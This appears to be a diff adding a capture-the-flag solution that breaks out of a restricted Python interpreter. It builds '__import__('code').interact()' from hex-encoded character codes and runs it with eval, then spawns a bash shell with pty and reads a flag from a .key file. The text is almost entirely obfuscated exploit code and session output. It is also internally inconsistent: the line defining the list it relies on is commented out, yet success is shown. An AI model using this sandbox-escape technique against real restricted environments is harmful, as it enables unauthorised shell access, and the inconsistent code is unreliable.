@@ -1,0 +1,72 @@
+Get flag from the .key file
+# globals().update({chr(0x62):list()})
+globals().update({chr(0x62 + 1):str()})
+b.append(0x5F)
+b.append(0x5F)
+b.append(0x69)
+b.append(0x6D)
+b.append(0x60 + 0x10)
+b.append(0x6F)
+b.append(0x62 + 0x10)
+b.append(0x64 + 0x10)
+b.append(0x5F)
+b.append(0x5F)
+b.append(0x28)
+b.append(0x26 + 0x01)
+b.append(0x62 + 0x01)
+b.append(0x6F)
+b.append(0x64)
+b.append(0x65)
+b.append(0x26 + 0x01)
+b.append(0x29)
+b.append(0x2E)
+b.append(0x69)
+b.append(0x6E)
+b.append(0x64 + 0x10)
+b.append(0x65)
+b.append(0x62 + 0x10)
+b.append(0x61)
+b.append(0x62 + 0x01)
+b.append(0x64 + 0x10)
+b.append(0x28)
+b.append(0x29)
+eval(c.join(chr(x) for x in b)) Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+#  Result:  None
+# 
+Python 2.7.3  
+[GCC 4.7.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+(InteractiveConsole)
+>>> import pty; pty.spawn("/bin/bash")
+bash-4.2$ cat .key
+y0u_g0t_tha_k4frz_fl4g_w3ll_d0n3
+bash-4.2$
